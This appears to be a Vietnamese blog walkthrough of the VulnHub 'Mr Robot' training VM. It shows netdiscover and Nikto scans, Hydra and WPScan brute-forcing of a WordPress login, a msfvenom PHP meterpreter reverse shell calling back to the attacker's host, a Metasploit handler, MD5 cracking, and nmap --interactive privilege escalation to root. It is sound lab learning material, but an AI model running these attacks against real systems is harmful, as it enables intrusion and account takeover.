---
title: Mr Robot
description: "Khai thác máy chủ ảo hoá Mr.Robot"
slug: mrrobot
date: 2020-09-24 09:00:00+0000
image: mr-robot.png
categories:
    - RedTeam
tags:
    - CTF
    - Hacking
---

<p>Máy chủ ảo hóa này được dựa trên phim truyền hình ăn khách Mr Robot. Máy chủ ảo hóa này có ba khóa ẩn ở các vị trí khác nhau. Mục tiêu của bạn là tìm thấy cả ba. Mỗi chìa khóa sẽ có mức độ từ dễ đến khó.</p>
<p>Máy chủ ảo hóa này phù hợp với những bạn ở mức beginner. Máy chủ ảo hóa này không có bất kỳ kiểu khai thác tiên tiến nào hoặc kỹ thuật đảo ngược.</p>
<h1 id="yeu-cau">Yêu cầu</h1>
<blockquote>
<p><a href="https://download.vulnhub.com/mrrobot/mrRobot.ova">https://download.vulnhub.com/mrrobot/mrRobot.ova</a></p>
</blockquote>
<h1 id="thuc-hanh">Thực hành</h1>
<h2 id="buoc-1-quet-he-thong-may-chu-mr-robot">Bước 1: Quét hệ thống máy chủ Mr Robot</h2>
<p>Đầu tiên, chúng ta cần phải biết địa chỉ IP của máy chủ Mr Robot. Điều này có thể thực hiện dễ dàng thông qua công cụ quét mạng cực mạnh mà tôi muốn giới thiệu cho các bạn - đó là công cụ <strong>netdiscover</strong>. Nó thực hiện việc tìm địa chỉ IP thông qua việc sử dụng card mạng mà máy tính bạn đang sử dụng, từ đó bắt đầu gửi request các dãy IP khác nhau để xem IP nào đang tồn tại.</p>
<p>Như hình dưới là mình sử dụng card mạng <strong>eth0</strong> để quét mạng và tìm thấy IP lạ là <strong>192.168.226.158</strong> và khá chắc đó là IP mình đang cần tìm.</p>
<pre><code class="lang-bash">netdiscover -<span class="hljs-selector-tag">i</span> eth0
</code></pre>
<p><img class="article-img" src="https://raw.githubusercontent.com/minhgiau998/image/develop/2020/09/24/mr-robot-01.png#full" alt="mr-robot-01.png"></p>
<h2 id="buoc-2-truy-cap-host">Bước 2: Truy cập host</h2>
<p>Mở trình duyệt Firefox truy cập vào địa chỉ 192.168.226.158 và sẽ vào trang web có giao diện như hình.</p>
<p><img class="article-img" src="https://raw.githubusercontent.com/minhgiau998/image/develop/2020/09/24/mr-robot-02.png#full" alt="mr-robot-02.png"></p>
<h2 id="buoc-3-kiem-tra-website-mr-robot">Bước 3: Kiểm tra website Mr Robot</h2>
<p>Chúng ta sẽ kiểm tra website thông qua công cụ <strong>Nikto</strong> - công cụ quét lỗ hổng website mã nguồn mở cho phép quét các máy chủ web thực hiện kiểm tra toàn diện đối với máy chủ web cho nhiều mục. Để sử dụng công cụ này chúng ta có thể gõ lệnh như sau:</p>
<pre><code class="lang-bash"><span class="hljs-selector-tag">nikto</span> <span class="hljs-selector-tag">-h</span> 192<span class="hljs-selector-class">.168</span><span class="hljs-selector-class">.226</span><span class="hljs-selector-class">.158</span>
</code></pre>
<p>Thông tin website sẽ hiển thị như hình dưới đây:</p>
<p><img class="article-img" src="https://raw.githubusercontent.com/minhgiau998/image/develop/2020/09/24/mr-robot-03.png#full" alt="mr-robot-03.png"></p>
<p>Mr Robot sử dụng nền tảng <strong>Wordpress</strong> - nền tảng khá phổ biến hiện nay được dùng để làm blog cá nhân. Ngoài ra, nikto còn quét được các đường dẫn nhạy cảm như <strong>/admin</strong>, <strong>/wp-login</strong>, <strong>/wp-admin</strong>.</p>
<h2 id="buoc-4-kiem-tra-file-robots-txt">Bước 4: Kiểm tra file robots.txt</h2>
<p>Chúng ta thử kiểm tra xem có file <strong>robots.txt</strong> hay không bằng cách gõ trên trình duyệt như sau: <strong><a href="http://192.168.226.158/robots.txt">http://192.168.226.158/robots.txt</a></strong> và kết quả như hình dưới đây.</p>
<p><img class="article-img" src="https://raw.githubusercontent.com/minhgiau998/image/develop/2020/09/24/mr-robot-04.png#full" alt="mr-robot-04.png"></p>
<p>Kiểm tra thử file <strong>key-1-of-3.txt</strong> và sẽ thấy có một đoạn code đã bị mã hóa. Mình đã thử kiểm tra các mã hash nhưng không tìm được kết quả nên mình sẽ thực hiện tải file <strong>fsocity.dic</strong> bằng câu lệnh dưới đây:</p>
<pre><code class="lang-bash">wget <span class="hljs-string">http:</span><span class="hljs-comment">//192.168.226.158/fsocity.dic</span>
</code></pre>
<p>Kiểm tra file tải về bằng lệnh dưới đây và sẽ thấy một loạt các từ khóa ngẫu nhiên.</p>
<pre><code class="lang-bash"><span class="hljs-selector-tag">more</span> <span class="hljs-selector-tag">fsocity</span><span class="hljs-selector-class">.dic</span>
</code></pre>
<p><img class="article-img" src="https://raw.githubusercontent.com/minhgiau998/image/develop/2020/09/24/mr-robot-05.png#full" alt="mr-robot-05.png"></p>
<p>Chúng ta cũng tải file key-1-of-3.txt với cách thức cũng giống như trên.</p>
<h2 id="buoc-5-bruteforce-wordpress-login">Bước 5: Bruteforce Wordpress login</h2>
<p>Để có thể sử dụng cơ chế <strong>bruteforce</strong> để đăng nhập vào website Wordpress, cần phải biết các trường của form đăng nhập (hay còn gọi là các <strong>parameter</strong>). Chúng ta sẽ sử dụng một công cụ để thực hiện công việc này là <strong>OWASP - ZAP</strong>.</p>
<p>OWASP Zed Attack Proxy (ZAP) là công cụ được sử dụng cho việc pentest các ứng dụng web. Nó được thiết kế để sử dụng bởi các chuyên gia bảo mật và người phát triển, kiểm thử chức năng những người mới tham gia pentest sẽ có thêm những trải nghiệm mới, bổ sung cho các toolbox kiểm thử.</p>
<p>Chúng ta mở công cụ này bằng câu lệnh sau: <strong>owasp-zap</strong>. Sau đó, nhập vào đường dẫn của liên kết đến trang đăng nhập của Wordpress có dạng như sau: <strong><a href="http://192.168.226.158/wp-login">http://192.168.226.158/wp-login</a></strong>.</p>
<p><img class="article-img" src="https://raw.githubusercontent.com/minhgiau998/image/develop/2020/09/24/mr-robot-06.png#full" alt="mr-robot-06.png"></p>
<p>Menu bên trái là danh sách các file mà công cụ đã quét được, chúng ta sẽ chọn form có tên như sau: <strong>POST:wp-login.php(log,pwd,redirect_to,rememberme,testcookie,wp-submit)</strong>. Phía bên phải, chúng ta chọn tab Request và sẽ thấy các parameter như hình dưới.</p>
<p><img class="article-img" src="https://raw.githubusercontent.com/minhgiau998/image/develop/2020/09/24/mr-robot-07.png#full" alt="mr-robot-07.png"></p>
<p>Để có thể bruteforce cần có một bộ từ điển, ở đây chúng ta đã có file từ điển là fsocity.dic. Chúng ta sử dụng công cụ brutforce khá nổi tiếng đó là <strong>Hydra</strong>.</p>
<p>Hydra là một công cụ dạng <strong>cracker</strong> có thể đăng nhập song song hỗ trợ nhiều giao thức để tấn công. Nó rất nhanh và linh hoạt, và các mô-đun mới rất dễ dàng để thêm. Công cụ này giúp các nhà nghiên cứu và chuyên gia tư vấn bảo mật có thể cho thấy việc truy cập trái phép vào hệ thống từ xa dễ dàng như thế nào.</p>
<p>Trước tiên, cần phải sắp xếp lại file từ điển của chúng ta bằng câu lệnh sau:</p>
<pre><code class="lang-bash">cat fsocity.dic | <span class="hljs-type">sort</span> -u | <span class="hljs-type">uniq</span> &gt; wordlist.dic
</code></pre>
<p>Chúng ta sẽ thực hiện việc bruteforce đăng nhập vào trang web thông qua dãy lệnh như sau:</p>
<pre><code class="lang-bash">hydra -V -L wordlist<span class="hljs-selector-class">.dic</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-number">123</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">226.158</span> http-post-<span class="hljs-selector-tag">form</span> <span class="hljs-string">'/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In:F=Invalid username'</span>
</code></pre>
<p>Chúng ta sẽ thấy tài khoản có tên <strong>Elliot</strong> có thể sử dụng để bruteforce.</p>
<p><img class="article-img" src="https://raw.githubusercontent.com/minhgiau998/image/develop/2020/09/24/mr-robot-08.png#full" alt="mr-robot-08.png"></p>
<p>Chúng ta thử đăng nhập vào trang wordpress và thông báo hiển thị là bạn quên mật khẩu cho tài khoản elliot.</p>
<p><img class="article-img" src="https://raw.githubusercontent.com/minhgiau998/image/develop/2020/09/24/mr-robot-09.png#full" alt="mr-robot-09.png"></p>
<p>Chúng ta sử dụng một công cụ khác để bruteforce các trang đăng nhập wordpress là <strong>Wpscan</strong>.</p>
<p>WPScan là một trình quét lỗ hổng WordPress blackbox có thể được sử dụng để quét các cài đặt WordPress từ xa để tìm các vấn đề bảo mật.</p>
<p>Chúng ta bruteforce mật khẩu tài khoản bằng câu lệnh như sau:</p>
<pre><code class="lang-bash"><span class="hljs-comment">wpscan</span> <span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">url</span> <span class="hljs-comment">192</span><span class="hljs-string">.</span><span class="hljs-comment">168</span><span class="hljs-string">.</span><span class="hljs-comment">226</span><span class="hljs-string">.</span><span class="hljs-comment">158</span> <span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">passwords</span> <span class="hljs-comment">/home/user/Downloads/wordlist</span><span class="hljs-string">.</span><span class="hljs-comment">dic</span> <span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">usernames</span> <span class="hljs-comment">Elliot</span> <span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">wp</span><span class="hljs-literal">-</span><span class="hljs-comment">content</span><span class="hljs-literal">-</span><span class="hljs-comment">dir</span> <span class="hljs-comment">wp</span><span class="hljs-literal">-</span><span class="hljs-comment">content</span>
</code></pre>
<p><img class="article-img" src="https://raw.githubusercontent.com/minhgiau998/image/develop/2020/09/24/mr-robot-10.png#full" alt="mr-robot-10.png"></p>
<p>Chúng ta đã tìm được mật khẩu của tài khoản Elliot. Bây giờ chúng ta thử đăng nhập vào trang web và kết quả như hình dưới đây:</p>
<p><img class="article-img" src="https://raw.githubusercontent.com/minhgiau998/image/develop/2020/09/24/mr-robot-11.png#full" alt="mr-robot-11.png"></p>
<h2 id="buoc-6-upload-shell">Bước 6: Upload Shell</h2>
<p>Để chiếm quyền máy chủ Mr Robot, chúng ta cần phải thực hiện việc tải lên shell cho phép thực hiện các khai thác đến máy chủ. Đầu tiên, chúng ta cần cài đặt một <strong>plugin</strong> có tên là <strong>File manager</strong> (Do ở đây Elliot đã là admin nên có thể cài đặt được bất kỳ plugin nào).</p>
<p>File manager cho phép chúng ta quản lý thư mục và file dễ dàng hơn trên website. Trên menu bên phải trỏ vào <strong>Plugin</strong> và chọn phần <strong>Add new</strong> để tiến hành cài đặt mới plugin. Ở ô <strong>Search Plugins</strong>, gõ vào ô tìm kiếm là <strong>File manager</strong>. Nó sẽ có dạng giống như hình bên dưới đây:</p>
<p><img class="article-img" src="https://raw.githubusercontent.com/minhgiau998/image/develop/2020/09/24/mr-robot-12.png#full" alt="mr-robot-12.png"></p>
<p>Nhấn vào nút <strong>Install Now</strong> để bắt đầu cài đặt plugin. Sau khi cài đặt xong, chuyển sang phần <strong>Installed Plugins</strong> và chọn plugin <strong>WP File manager</strong> để tiến hành <strong>Active</strong>. Tải lại trang và chọn phần <strong>File manager</strong> để kiểm tra file.</p>
<p>Chúng ta vào thư mục <strong>wp-content/uploads</strong> để tiến hành kiểm tra nội dụng trước khi thực hiện việc tải lên shell. Trong thư mục uploads, nội dung sẽ có dạng như hình dưới:</p>
<p><img class="article-img" src="https://raw.githubusercontent.com/minhgiau998/image/develop/2020/09/24/mr-robot-13.png#full" alt="mr-robot-13.png"></p>
<p>Để thực hiện việc tải shell, chúng ta cần phải chuẩn bị shell trước đã. Công cụ <strong>MSFvenom</strong> là sự kết hợp giữa <strong>Msfpayload</strong> và <strong>Msfencode</strong>, được đưa vào bộ công cụ pentest rất nổi tiếng đó là <strong>Metasploit</strong>.</p>
<p>Do website này sử dụng nền tảng Wordpress (ngôn ngữ <strong>Php</strong>) nên mình sẽ tạo một con shell dạng php bằng câu lệnh dưới đây:</p>
<pre><code class="lang-bash">msfvenom -p php/meterpreter/reverse_tcp LHOST=<span class="hljs-number">192.168</span><span class="hljs-number">.226</span><span class="hljs-number">.155</span> LPORT=<span class="hljs-number">4444</span> -f raw &gt; shell.php
</code></pre>
<p>Kiểm tra <strong>shell.php</strong> bằng câu lệnh sau:</p>
<pre><code class="lang-bash"><span class="hljs-keyword">cat</span> <span class="hljs-keyword">shell</span>.php
</code></pre>
<p>Về cơ bản, đoạn code này sẽ tiến hành tạo một kết nối dạng <strong>socket</strong> và cho phép thực hiện các quyền cao đối với máy chủ website. <strong>LHOST</strong> chứa địa chỉ IP của máy attacker và <strong>LPORT</strong> sẽ tiến hành kết nối thông qua port <strong>4444</strong>. Đoạn code sẽ có dạng như hình dưới đây:</p>
<p><img class="article-img" src="https://raw.githubusercontent.com/minhgiau998/image/develop/2020/09/24/mr-robot-14.png#full" alt="mr-robot-14.png"></p>
<p>Mở giao diện quản lý website và tiến hành tải file shell.php. Sau khi upload xong, chúng ta mở Terminal và gõ <strong>msfconsole</strong> để mở công cụ Metasploit.</p>
<h2 id="buoc-7-khai-thac-shell-bang-metasploit">Bước 7: Khai thác shell bằng Metasploit</h2>
<p>Công cụ Metasploit là một công cụ khá quen thuộc đối với các nhà bảo mật bởi vì họ hỗ trợ một lượng lớn thư viện các nền tảng và các mã lỗi khác nhau. Chúng ta sẽ tiến hành gõ một loạt các câu lệnh sau:</p>
<pre><code class="lang-bash">use exploit/multi/handler
<span class="hljs-keyword">set</span> payload <span class="hljs-comment">php</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span>
<span class="hljs-keyword">set</span> <span class="hljs-comment">LHOST 192.168.226.155</span>
<span class="hljs-keyword">set</span> <span class="hljs-comment">LPORT 4444</span>
exploit <span class="hljs-comment">-j -z</span>
</code></pre>
<p><img class="article-img" src="https://raw.githubusercontent.com/minhgiau998/image/develop/2020/09/24/mr-robot-15.png#full" alt="mr-robot-15.png"></p>
<p>Chúng ta tiến hành chạy shell bằng đường dẫn như sau: <strong><a href="http://192.168.226.158/wp-content/uploads/shell.php">http://192.168.226.158/wp-content/uploads/shell.php</a></strong>. Chúng ta đã thành công trong việc thiết lập kết nối đến máy chủ. Chúng ta gõ câu lệnh dưới đây để tiến hành tương tác với máy chủ:</p>
<pre><code class="lang-bash">sessions -<span class="hljs-selector-tag">i</span> <span class="hljs-number">1</span>
</code></pre>
<p><img class="article-img" src="https://raw.githubusercontent.com/minhgiau998/image/develop/2020/09/24/mr-robot-16.png#full" alt="mr-robot-16.png"></p>
<p>Tiến hành kiểm tra thông tin hệ điều hành máy chủ bằng lệnh sau:</p>
<pre><code class="lang-bash"><span class="hljs-attribute">sysinfo</span>
</code></pre>
<p><img class="article-img" src="https://raw.githubusercontent.com/minhgiau998/image/develop/2020/09/24/mr-robot-17.png#full" alt="mr-robot-17.png"></p>
<p>Máy chủ sử dụng hệ điều hành <strong>Linux</strong>, tức là chúng ta cần phải tìm xem trong các thư mục của hệ điều hành này thì nơi nào sẽ chứa chìa khóa cần tìm.</p>
<p>Đầu tiên, chúng ta cần kiểm tra được thư mục <strong>home</strong> có người dùng nào đang sử dụng. Chúng ta gõ các lệnh sau để kiểm tra:</p>
<pre><code class="lang-bash"><span class="hljs-keyword">cd</span> /home
<span class="hljs-keyword">ls</span>
</code></pre>
<p><img class="article-img" src="https://raw.githubusercontent.com/minhgiau998/image/develop/2020/09/24/mr-robot-18.png#full" alt="mr-robot-18.png"></p>
<p>Chúng ta phát hiện user đang sử dụng có tên là <strong>robot</strong>, chúng ta tiếp tục vào thư mục robot và sẽ thấy điều bất ngờ xảy ra:</p>
<p><img class="article-img" src="https://raw.githubusercontent.com/minhgiau998/image/develop/2020/09/24/mr-robot-19.png#full" alt="mr-robot-19.png"></p>
<p>Chúng ta đã tìm ra được chìa khóa thứ 2, nhưng chúng ta không có cách nào để mở được nó. Chúng ta để ý rằng có sự xuất hiện của file <strong>password.raw-md5</strong>. File mật khẩu này đã bị mã hóa bằng mã <strong>MD5</strong>, chúng ta sẽ kiểm tra file này và tiến hành giải mã nó.</p>
<p>Kiểm tra nội dung file bằng lệnh dưới đây:</p>
<pre><code class="lang-bash"><span class="hljs-selector-tag">cat</span> <span class="hljs-selector-tag">password</span><span class="hljs-selector-class">.raw-md5</span>
</code></pre>
<p><img class="article-img" src="https://raw.githubusercontent.com/minhgiau998/image/develop/2020/09/24/mr-robot-20.png#full" alt="mr-robot-20.png"></p>
<p>Dán đoạn mã này lên website <a href="https://www.md5online.org/">https://www.md5online.org/</a> và ta sẽ được kết quả như sau:</p>
<p><img class="article-img" src="https://raw.githubusercontent.com/minhgiau998/image/develop/2020/09/24/mr-robot-21.png#full" alt="mr-robot-21.png"></p>
<p>Chúng ta đã có mật khẩu, việc cuối cùng là đăng nhập máy chủ quyền cao nhất - <strong>root</strong>. Chúng ta gõ câu lệnh sau trong Metasploit:</p>
<pre><code class="lang-bash"><span class="hljs-attribute">shell</span>
</code></pre>
<p><img class="article-img" src="https://raw.githubusercontent.com/minhgiau998/image/develop/2020/09/24/mr-robot-22.png#full" alt="mr-robot-22.png"></p>
<p>Câu lệnh này sẽ cho phép tạo tiến trình thực thi các lệnh trong máy chủ. Nhưng có 1 vấn đề khá nan giải, đó là bạn không thể đăng nhập đơn giản chỉ với câu lệnh <strong>sudo -i</strong> do chúng ta đang thực hiện kết nối thông qua socket.</p>
<p>Để thực hiện việc này, chúng ta cần phải kiểm tra xem máy chủ này có sử dụng <strong>Python</strong> hay không với câu lệnh sau:</p>
<pre><code class="lang-python"><span class="hljs-keyword">python</span> --<span class="hljs-keyword">version</span>
</code></pre>
<p><img class="article-img" src="https://raw.githubusercontent.com/minhgiau998/image/develop/2020/09/24/mr-robot-23.png#full" alt="mr-robot-23.png"></p>
<p>Khá may mắn khi máy chủ đã tích hợp sẵn Python. Việc bây giờ của chúng ta là viết một đoạn script cho phép thực hiện các câu lệnh <strong>bash</strong> thông qua các thư viện có sẵn trong Python. Đoạn script sẽ có dạng như thế này:</p>
<p>echo &quot;import pty; pty.spawn(&#39;/bin/bash&#39;)&quot; &gt; /tmp/asdf.py</p>
<p>Câu lệnh trên thực hiện import các câu lệnh bash từ thư viện <strong>pty</strong> cho phép thực thi các lệnh trên máy chủ. Để chạy đoạn script này gõ câu lệnh như sau:</p>
<pre><code class="lang-python"><span class="hljs-keyword">python</span> /tmp/asdf.<span class="hljs-keyword">py</span>
</code></pre>
<p><img class="article-img" src="https://raw.githubusercontent.com/minhgiau998/image/develop/2020/09/24/mr-robot-24.png#full" alt="mr-robot-24.png"></p>
<p>Bây giờ chúng ta đang ở trong trạng thái có thể thực hiện các lệnh giống như Terminal của Linux. Nếu lưu ý một tý, có thể thấy user mặc định của máy chủ này là <strong>daemon</strong>. Chúng ta cần phải đăng nhập với user là robot, có thể thực hiện các lệnh dưới đây:</p>
<pre><code class="lang-bash"><span class="hljs-attribute">su - robot</span>
</code></pre>
<p>Nó yêu cầu chúng ta phải nhập mật khẩu, chúng ta hãy lấy mật khẩu mà chúng ta vừa giải mã ra được.</p>
<p><img class="article-img" src="https://raw.githubusercontent.com/minhgiau998/image/develop/2020/09/24/mr-robot-25.png#full" alt="mr-robot-25.png"></p>
<p>Bây giờ chúng ta có thể xem được dữ liệu của chìa khóa thứ 2 rồi, thực hiện câu lệnh này:</p>
<pre><code class="lang-bash">cat <span class="hljs-type">key</span><span class="hljs-number">-2</span>-of<span class="hljs-number">-3.</span>txt
</code></pre>
<p><img class="article-img" src="https://raw.githubusercontent.com/minhgiau998/image/develop/2020/09/24/mr-robot-26.png#full" alt="mr-robot-26.png"></p>
<h2 id="buoc-8-tim-chia-khoa-cuoi-cung">Bước 8: Tìm chìa khóa cuối cùng</h2>
<p>Chúng ta thử vào thư mục root bằng câu lệnh sau:</p>
<pre><code class="lang-bash"><span class="hljs-built_in">cd</span> /root
</code></pre>
<p><img class="article-img" src="https://raw.githubusercontent.com/minhgiau998/image/develop/2020/09/24/mr-robot-27.png#full" alt="mr-robot-27.png"></p>
<p>Chúng ta đành phải truy cập thư mục root thông qua công cụ <strong>Nmap</strong>. Ngoài tính năng quét mạng ra, nó còn có thể giúp chúng ta tương tác với hệ điều hành. Chúng ta sẽ thực hiện câu lệnh sau để tương tác với hệ điều hành.</p>
<pre><code class="lang-bash">nmap <span class="hljs-comment">--interactive</span>
</code></pre>
<p><img class="article-img" src="https://raw.githubusercontent.com/minhgiau998/image/develop/2020/09/24/mr-robot-28.png#full" alt="mr-robot-28.png"></p>
<p>Đoạn code trên sẽ cho phép chúng ta leo thang đặc quyền (<strong>privilege escalation</strong>) và chiếm quyền kiểm soát hệ thống. Chúng ta sẽ kiểm tra thư mục root với các câu lệnh sau:</p>
<pre><code class="lang-bash">!<span class="hljs-keyword">sh</span>
whoami
<span class="hljs-keyword">cd</span> /root
<span class="hljs-keyword">ls</span>
</code></pre>
<p>Chúng ta đã tìm được chìa khóa thứ ba. Chúng ta hiển thị dữ liệu chìa khóa với cách thức như trên. Dưới đây là kết quả:</p>
<p><img class="article-img" src="https://raw.githubusercontent.com/minhgiau998/image/develop/2020/09/24/mr-robot-29.png#full" alt="mr-robot-29.png"></p>
<h1 id="ket-luan">Kết Luận</h1>
<p>Vừa rồi chúng ta đã thực hiện rất nhiều thủ thuật để có thể tìm thấy 2 chìa khóa còn lại. Từ đây chúng ta rút được nhiều kinh nghiệm như sau:</p>
<ul>
<li>Cần phải kiểm tra file robots.txt kỹ càng để cho phép truy cập hay không truy cập thư mục nào.</li>
<li>Giao thức http thực sự không an toàn. Cần phải nâng cấp thành chứng chỉ SSL để được mã hóa khi gửi dữ liệu lên server.</li>
<li>Cần phải đặt mật khẩu có độ dài và độ phức tạp lớn.</li>
</ul>
